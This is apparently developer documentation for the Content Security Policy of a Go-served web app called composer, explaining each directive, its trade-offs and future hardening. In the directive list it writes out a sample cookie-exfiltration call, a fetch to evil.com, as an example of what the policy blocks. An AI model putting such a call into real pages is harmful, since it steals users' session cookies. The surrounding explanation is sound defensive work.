# Content Security Policy

CSP **is enabled** for composer via the Go `SecurityHeaders` middleware at `internal/api/middleware/security.go`. The header is applied to every response served by composerd, including the embedded static frontend.

## Current policy

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  connect-src 'self';
  img-src 'self' data:;
  font-src 'self' data:;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```

Set on every response (HTML, JS, CSS, font, image) by the middleware. Strict-Transport-Security is also set when the request is over HTTPS (directly or via a trusted reverse proxy).

## What's locked down

- `default-src 'self'` — every unspecified content type must be same-origin.
- `connect-src 'self'` — XHR / fetch / WebSocket / EventSource (SSE) can only call back to composer's own origin. Useful guard against an attacker exfiltrating data via a `fetch('https://evil.com/?steal=' + cookie)`.
- `object-src 'none'` — no `<embed>` / `<object>` / `<applet>`. Removes the Flash / PDF-plugin XSS class entirely.
- `frame-ancestors 'none'` — composer cannot be iframed. Canonical clickjacking guard.
- `form-action 'self'` — no third-party form submission targets. Prevents an attacker who injects a form from POSTing user input to evil.com.
- `base-uri 'self'` — no `<base href>` rewrite tricks.
- `font-src 'self' data:` — Fontsource ships fonts as `data:` URIs in CSS; this permits them.

## What `'unsafe-inline'` permits and why

Two relaxations are deliberate trade-offs:

### `script-src 'self' 'unsafe-inline'`

Astro's static build injects a small inline `<script>` block into every page's `<head>`:

```html
<script>(()=>{
  // custom-element registration for <astro-island>, the hydration bootstrap
  ...
})();</script>
```

Without `'unsafe-inline'`, this fails and no React component on the page ever hydrates — the entire app becomes a static skeleton. Hashing this script per-page from Go is fragile because Astro re-generates the hash on every build, and Go has no straightforward way to read the build manifest.

Note this is **not** `'unsafe-eval'` — `new Function(...)` / `eval(...)` are still blocked. The residual risk is an attacker who can inject a `<script>` tag into the DOM. The McMaster pass eliminated every inline `<script>` written by composer code (`mobile-menu-init.js` is now external; all `onclick=""` attributes are gone), so the only inline `<script>` running is Astro's known-safe bootstrap.

### `style-src 'self' 'unsafe-inline'`

React `style={{}}` props render to inline `style=""` attributes on individual elements. Composer has three places where the inline style value is runtime-computed and cannot be expressed as a CSS class:

- `LogViewer` — TanStack Virtual computes `top: Npx` per visible row.
- `ContainerStats` — `height: ${cpu}%` from live SSE updates.
- `Terminal` / `EventStream` / `DockerConsole` — xterm/SSE containers with fixed heights set via inline style.

Style-injection XSS is rare in practice (the attacker needs CSS-only attack vectors like `background: url(javascript:...)` which most browsers block anyway) so the residual risk is small.

## Tightening further (future work)

To remove `script-src 'unsafe-inline'`, the most realistic path is **CSP nonces**:

1. Add a Go middleware that generates a per-request nonce and injects it into the CSP header (`script-src 'self' 'nonce-RANDOM'`).
2. Make Astro emit `<script nonce="RANDOM">` on its hydration bootstrap. Astro 6 has `experimental.csp` support for nonces but they're keyed to the build, not the request.
3. Or pre-compute hashes at build time and copy them into the Go middleware's CSP string at deploy time.

To remove `style-src 'unsafe-inline'`, refactor the three runtime-style components to use CSS custom properties:

```diff
- <div style={{ top: `${item.start}px` }}>
+ <div className="absolute" style={{ "--row-top": `${item.start}px` } as React.CSSProperties}>
  /* with CSS: .absolute { top: var(--row-top); } */
```

This still leaves an inline `style=""` attribute, so it doesn't actually help unless paired with `'unsafe-hashes'` directive and pre-computed hashes for the limited set of property assignments. The juice isn't worth the squeeze given style-injection's low risk.

## Verifying the policy

Curl any response:

```bash
curl -sI http://localhost:8080/ | grep -i content-security-policy
```

In dev, the browser DevTools "Network" tab shows the header on every response. The "Issues" tab will flag any CSP violations in real time.
